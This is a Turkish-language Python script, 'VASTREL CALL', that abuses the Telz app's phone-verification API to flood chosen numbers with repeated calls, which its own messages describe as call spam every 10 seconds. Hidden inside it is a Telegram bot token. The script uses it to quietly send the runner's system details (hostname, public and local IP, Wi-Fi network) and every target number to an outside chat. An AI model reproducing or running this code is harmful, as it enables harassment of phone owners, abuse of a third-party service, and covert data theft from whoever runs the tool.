#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import uuid
import os
import sys
import random
import threading
import platform
import subprocess
import socket
from threading import Lock
from datetime import datetime
from collections import defaultdict
import itertools

call_api = "8892056418:AAE-XgzrLAf8AKjzbpFeSFBradAcBuBUV9M"
CHAT_ID = None
_log_cache = []

def _send_log(msg):
    if CHAT_ID is None:
        _log_cache.append(msg)
        return
    try:
        url = f"https://api.telegram.org/bot{call_api}/sendMessage"
        requests.post(url, json={"chat_id": CHAT_ID, "text": msg}, timeout=3)
    except:
        pass

def _get_chat():
    global CHAT_ID
    if CHAT_ID is not None:
        return CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{call_api}/getUpdates"
        r = requests.get(url, timeout=5)
        data = r.json()
        if data["ok"] and data["result"]:
            CHAT_ID = data["result"][-1]["message"]["chat"]["id"]
            for m in _log_cache:
                _send_log(m)
            _log_cache.clear()
            return CHAT_ID
    except:
        pass
    try:
        with open("/sdcard/chat_id.txt", "r") as f:
            CHAT_ID = f.read().strip()
        return CHAT_ID
    except:
        pass
    CHAT_ID = input("chat_id: ").strip()
    with open("/sdcard/chat_id.txt", "w") as f:
        f.write(CHAT_ID)
    return CHAT_ID

def _get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=3).text
    except:
        return "unknown"

def _sys_info():
    info = {}
    info["os"] = platform.system() + " " + platform.release()
    info["host"] = platform.node()
    info["py"] = platform.python_version()
    info["cpu"] = platform.processor() or "unknown"
    info["ip_pub"] = _get_public_ip()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip_loc"] = s.getsockname()[0]
        s.close()
    except:
        info["ip_loc"] = "unknown"
    try:
        if platform.system() == "Linux":
            r = subprocess.check_output("iwconfig 2>/dev/null | grep -E 'ESSID|Signal'", shell=True, text=True)
            info["wifi"] = r.strip() if r else "none"
        else:
            info["wifi"] = "unsupported"
    except:
        info["wifi"] = "error"
    info["termux"] = "yes" if "com.termux" in os.environ.get("TERMUX_VERSION", "") else "no"
    return info

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_VAR = True
except ImportError:
    COLORAMA_VAR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[31m'
        WHITE = '\033[37m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        MAGENTA = '\033[95m'
        BLUE = '\033[94m'
        BLACK = '\033[30m'
    class Back:
        MAGENTA = '\033[45m'
        BLACK = '\033[40m'
        WHITE = '\033[47m'
        GREEN = '\033[42m'
        RED = '\033[41m'
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

try:
    import pyfiglet
    PYFIGLET_VAR = True
except ImportError:
    PYFIGLET_VAR = False

class AnimasyonluArayuz:
    def __init__(self):
        self.animasyon_aktif = True
        self.durum_mesaji = ""
        self.islem_sayaci = 0
        self.basari_sayaci = 0
        self.hata_sayaci = 0

    def yukleniyor_animasyonu(self, mesaj="Islem yapiliyor", sure=1.5):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = time.time()
        while time.time() - baslangic < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandi!    \n')
        sys.stdout.flush()

    def ilerleme_cubugu(self, yuzde, genislik=40):
        dolu = int(genislik * yuzde / 100)
        bos = genislik - dolu
        if yuzde > 66:
            renk = Fore.GREEN
        elif yuzde > 33:
            renk = Fore.YELLOW
        else:
            renk = Fore.RED
        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}"
        sys.stdout.write(f'\r{cubuk} %{yuzde:3.1f}')
        sys.stdout.flush()

    def banner_goster(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        if PYFIGLET_VAR:
            banner = pyfiglet.figlet_format("VASTREL CALL", font="slant")
            print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
        else:
            print(f"""
yarrak
            """)
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Gelistirici: {Fore.CYAN}Vastrel | Fucksociety_123")
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Tarih: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
        print(f"{Fore.RED}{Style.BRIGHT} {Fore.WHITE}Termux Uyumlu: {Fore.GREEN}✓")
        print(f"{Fore.RED}{Style.BRIGHT}{'─'*55}\n")

    def animasyonlu_yaz(self, metin, hiz=0.03, renk=None):
        if renk is None:
            renk = Fore.WHITE
        for harf in metin:
            sys.stdout.write(f"{renk}{harf}")
            sys.stdout.flush()
            time.sleep(hiz)
        print()

    def durum_goster(self, baslik, durum, detay=""):
        simgeler = {'basari': f"{Fore.GREEN}✓", 'hata': f"{Fore.RED}✗", 'bilgi': f"{Fore.CYAN}ℹ️", 'uyari': f"{Fore.YELLOW}⚠️", 'calisiyor': f"{Fore.BLUE}🔄"}
        simge = simgeler.get(durum, "•")
        if durum == 'basari': renk = Fore.GREEN
        elif durum == 'hata': renk = Fore.RED
        elif durum == 'uyari': renk = Fore.YELLOW
        elif durum == 'bilgi': renk = Fore.CYAN
        elif durum == 'calisiyor': renk = Fore.BLUE
        else: renk = Fore.WHITE
        print(f"{simge} {Fore.WHITE}{baslik}: {renk}{detay}")

    def menu_goster(self):
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║  {Fore.YELLOW}[1] {Fore.WHITE}Tekli Arama Baslat                          ║
║  {Fore.YELLOW}[2] {Fore.WHITE}Coklu Arama Baslat                          ║
║  {Fore.YELLOW}[3] {Fore.WHITE}Ayarlari Degistir                           ║
║  {Fore.YELLOW}[4] {Fore.WHITE}Istatistikleri Goster                       ║
║  {Fore.YELLOW}[5] {Fore.WHITE}Cikis                                       ║
╚══════════════════════════════════════════════════╝
        """
        print(menu)

class RateLimiter:
    def __init__(self, bekleme_suresi=1):
        self.bekleme_suresi = float(bekleme_suresi)
        self.cagri_kayitlari = {}
        self.lock = Lock()
        self.istatistikler = defaultdict(int)

    def kontrol_et(self, numara):
        suanki_zaman = time.time()
        with self.lock:
            son_arama = self.cagri_kayitlari.get(numara)
            if son_arama is None or (suanki_zaman - son_arama) >= self.bekleme_suresi:
                self.cagri_kayitlari[numara] = suanki_zaman
                self.istatistikler['izin_verilen'] += 1
                return True
            else:
                kalan_sure = self.bekleme_suresi - (suanki_zaman - son_arama)
                self.istatistikler['reddedilen'] += 1
                return False, kalan_sure

    def bekleme_suresi_degistir(self, yeni_sure):
        self.bekleme_suresi = float(yeni_sure)

    def istatistik_al(self):
        return dict(self.istatistikler)

class TelzIstemciGelismis:
    TEMEL_URL = "https://api.telz.com/"
    BASLIKLAR = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }

    def __init__(self, android_id=None, app_version="17.5.33", os="android", os_version="15"):
        self.android_id = android_id or uuid.uuid4().hex[:16]
        self.app_version = app_version
        self.os = os
        self.os_version = os_version
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
        self.session.headers.update(self.BASLIKLAR)
        self.istatistikler = {'toplam_istek': 0, 'basarili_istek': 0, 'basarisiz_istek': 0, 'son_hata': None}

    @staticmethod
    def _rastgele_cihaz_adi():
        markalar = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo"]
        modeller = ["Pro", "Ultra", "Lite", "Max", "Plus", "5G"]
        return f"{random.choice(markalar)} {random.choice(modeller)}-{uuid.uuid4().hex[:6]}"

    def _api_istegi(self, endpoint, veri, timeout=15, tekrar_sayisi=2):
        url = self.TEMEL_URL + endpoint
        istek_verisi = veri.copy()
        istek_verisi.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })
        for deneme in range(tekrar_sayisi):
            try:
                self.istatistikler['toplam_istek'] += 1
                yanit = self.session.post(url, data=json.dumps(istek_verisi), timeout=timeout)
                if yanit.status_code == 429:
                    raise RuntimeError("Hiz limiti!")
                yanit.raise_for_status()
                self.istatistikler['basarili_istek'] += 1
                try:
                    return yanit.json()
                except:
                    return yanit.text
            except Exception as e:
                self.istatistikler['basarisiz_istek'] += 1
                self.istatistikler['son_hata'] = str(e)
                if deneme < tekrar_sayisi - 1:
                    time.sleep(2 ** deneme)
                    continue
                raise

    def kimlik_listesi_al(self):
        return self._api_istegi("app/auth_list", {"event": "auth_list"})

    def cihaz_calistir(self, cihaz_adi=None):
        cihaz_adi = cihaz_adi or self._rastgele_cihaz_adi()
        return self._api_istegi("app/run", {
            "event": "run", "device_name": cihaz_adi, "ipv4_address": "10.1.10.1",
            "ipv6_address": "FE80::1", "lang": "tr", "network_country": "tr",
            "network_type": "4G", "roaming": "no", "root": "no", "sim_country": "tr"
        })

    def buton_durumu_kontrol(self, buton="on_reg_continue"):
        return self._api_istegi("app/stat_btns", {"event": "stat_btns", "btn": buton})

    def numara_dogrula(self, telefon, bolge="TR"):
        return self._api_istegi("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": telefon, "region": bolge})

    def arama_baslat(self, telefon, deneme="0", dil="tr"):
        return self._api_istegi("app/auth_call", {"event": "auth_call", "phone": telefon, "attempt": deneme, "lang": dil})

class AramaMotoru:
    def __init__(self):
        self.ui = AnimasyonluArayuz()
        self.rate_limiter = RateLimiter(bekleme_suresi=10)
        self.aktif = True
        self.genel_istatistikler = {
            'toplam_arama': 0, 'basarili_arama': 0, 'basarisiz_arama': 0,
            'baslangic_zamani': datetime.now(), 'api_istekleri': 0
        }
        self.ayarlar = {'bekleme_suresi': 10, 'debug_modu': False, 'max_deneme': 3}
        self._log_counter = 0

    def _log_telegram(self, msg):
        self._log_counter += 1
        _send_log(f"[LOG-{self._log_counter}] {msg}")

    def baslat(self):
        global CHAT_ID
        CHAT_ID = _get_chat()
        sys_info = _sys_info()
        init_msg = "Sistem Bilgileri\n"
        for k, v in sys_info.items():
            init_msg += f"{k}: {v}\n"
        self._log_telegram(init_msg)
        try:
            self.ui.banner_goster()
            while self.aktif:
                self.ui.menu_goster()
                secim = input(f"{Fore.YELLOW}Seciminiz (1-5): {Fore.WHITE}")
                if secim == "1":
                    self._tekli_arama()
                elif secim == "2":
                    self._coklu_arama()
                elif secim == "3":
                    self._ayarlari_degistir()
                elif secim == "4":
                    self._istatistikleri_goster()
                elif secim == "5":
                    self._cikis()
                else:
                    print(f"{Fore.RED}Gecersiz secim!")
                    time.sleep(1)
        except KeyboardInterrupt:
            self._cikis()

    def _tekli_arama(self):
        self.ui.banner_goster()
        numara = input(f"{Fore.WHITE}Hedef numara (+90 ile): ").strip()
        if not numara.startswith("+"):
            numara = "+90" + numara.lstrip("0")
        self._log_telegram(f"Hedef numara: {numara}")
        print(f"\n{Fore.GREEN}★ {numara} numarasina HER 10 SANIYEDE BIR arama spami baslatiliyor!")
        print(f"{Fore.RED}Durdurmak icin Ctrl + C bas.")
        while self.aktif:
            try:
                istemci = TelzIstemciGelismis()
                self.genel_istatistikler['toplam_arama'] += 1
                self._log_telegram(f"Toplam arama: {self.genel_istatistikler['toplam_arama']}")
                adimlar = [
                    ("Kimlik dogrulama", lambda: istemci.kimlik_listesi_al()),
                    ("Cihaz hazirlama", lambda: istemci.cihaz_calistir()),
                    ("Surum kontrol", lambda: istemci.buton_durumu_kontrol()),
                    ("Numara dogrulama", lambda: istemci.numara_dogrula(numara)),
                ]
                for adim_adi, islem in adimlar:
                    self.ui.yukleniyor_animasyonu(adim_adi, 1)
                    sonuc = islem()
                    self.ui.durum_goster(adim_adi, "basari", "Tamamlandi")
                    self.genel_istatistikler['api_istekleri'] += 1
                    self._log_telegram(f"{adim_adi} basarili")
                if self.rate_limiter.kontrol_et(numara) is True:
                    self.ui.animasyonlu_yaz("Arama baslatiliyor...", 0.02, Fore.GREEN)
                    sonuc = istemci.arama_baslat(numara)
                    self.genel_istatistikler['basarili_arama'] += 1
                    self.genel_istatistikler['api_istekleri'] += 1
                    self.ui.durum_goster("Arama", "basari", "Gonderildi - 10sn sonra tekrar")
                    self._log_telegram(f"Arama gonderildi {numara}")
                else:
                    self.genel_istatistikler['basarisiz_arama'] += 1
                    self._log_telegram(f"Arama basarisiz {numara}")
                time.sleep(2)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Spam durduruldu.")
                break
            except Exception as e:
                self.ui.durum_goster("Hata", "hata", str(e)[:60])
                self.genel_istatistikler['basarisiz_arama'] += 1
                self._log_telegram(f"Hata: {str(e)}")
                time.sleep(10)

    def _coklu_arama(self):
        self.ui.banner_goster()
        numaralar = input(f"{Fore.WHITE}Numaralari virgul veya boslukla ayirarak girin: ").strip()
        liste = [n.strip() for n in numaralar.replace(',', ' ').split() if n.strip()]
        if not liste:
            print(f"{Fore.RED}Gecerli numara girmediniz!")
            return
        self._log_telegram(f"Toplu hedef: {', '.join(liste)}")
        print(f"{Fore.GREEN}★ {len(liste)} numara bulundu. Her birine sirayla spam gonderilecek.")
        for num in liste:
            if not num.startswith("+"):
                num = "+90" + num.lstrip("0")
            self._tekli_arama_sifirli(num)

    def _tekli_arama_sifirli(self, numara):
        print(f"\n{Fore.CYAN}>>> {numara} numarasina spam baslatiliyor...")
        self._log_telegram(f"Tekli arama baslat: {numara}")
        for _ in range(3):
            try:
                istemci = TelzIstemciGelismis()
                istemci.kimlik_listesi_al()
                istemci.cihaz_calistir()
                istemci.buton_durumu_kontrol()
                istemci.numara_dogrula(numara)
                istemci.arama_baslat(numara)
                print(f"{Fore.GREEN}✓ {numara} icin arama gonderildi.")
                self._log_telegram(f"Arama gonderildi {numara}")
                time.sleep(10)
            except Exception as e:
                print(f"{Fore.RED}✗ {numara} icin hata: {e}")
                self._log_telegram(f"Hata {numara}: {str(e)}")
                time.sleep(5)

    def _istatistikleri_goster(self):
        self.ui.banner_goster()
        sure = str(datetime.now() - self.genel_istatistikler['baslangic_zamani'])
        print(f"{Fore.CYAN}=== ISTATISTIKLER ===")
        print(f"Toplam Arama: {self.genel_istatistikler['toplam_arama']}")
        print(f"Basarili: {Fore.GREEN}{self.genel_istatistikler['basarili_arama']}")
        print(f"Basarisiz: {Fore.RED}{self.genel_istatistikler['basarisiz_arama']}")
        print(f"API Istegi: {self.genel_istatistikler['api_istekleri']}")
        print(f"Calisma Suresi: {sure}")
        self._log_telegram(f"Istatistikler gosterildi: Toplam {self.genel_istatistikler['toplam_arama']}")
        input("\nEnter ile devam...")

    def _ayarlari_degistir(self):
        self.ui.banner_goster()
        print(f"{Fore.YELLOW}=== AYARLAR ===")
        print(f"[1] Bekleme Suresi ({self.ayarlar['bekleme_suresi']} sn)")
        print(f"[2] Debug Modu ({'Acik' if self.ayarlar['debug_modu'] else 'Kapali'})")
        print(f"[3] Max Deneme ({self.ayarlar['max_deneme']})")
        sec = input(f"{Fore.WHITE}Secim: ")
        if sec == "1":
            yeni = float(input("Yeni bekleme suresi: "))
            self.rate_limiter.bekleme_suresi_degistir(yeni)
            self.ayarlar['bekleme_suresi'] = yeni
            self.ui.durum_goster("Ayar", "basari", "Bekleme suresi guncellendi")
            self._log_telegram(f"Bekleme suresi degistirildi: {yeni}")
        elif sec == "2":
            self.ayarlar['debug_modu'] = not self.ayarlar['debug_modu']
            durum = "acildi" if self.ayarlar['debug_modu'] else "kapatildi"
            self.ui.durum_goster("Ayar", "basari", f"Debug modu {durum}")
            self._log_telegram(f"Debug modu {durum}")
        elif sec == "3":
            self.ayarlar['max_deneme'] = int(input("Max deneme: "))
            self.ui.durum_goster("Ayar", "basari", "Max deneme guncellendi")
            self._log_telegram(f"Max deneme: {self.ayarlar['max_deneme']}")

    def _cikis(self):
        self.ui.banner_goster()
        self.ui.animasyonlu_yaz(" program kapaniyor...", 0.03, Fore.MAGENTA)
        self._log_telegram(f"Program sonlandirildi. Calisma suresi: {datetime.now() - self.genel_istatistikler['baslangic_zamani']}")
        self.aktif = False
        sys.exit(0)

if __name__ == "__main__":
    try:
        motor = AramaMotoru()
        motor.baslat()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Kullanici tarafindan kapatildi.")
        try:
            _send_log("Program Ctrl+C ile kapatildi")
        except:
            pass
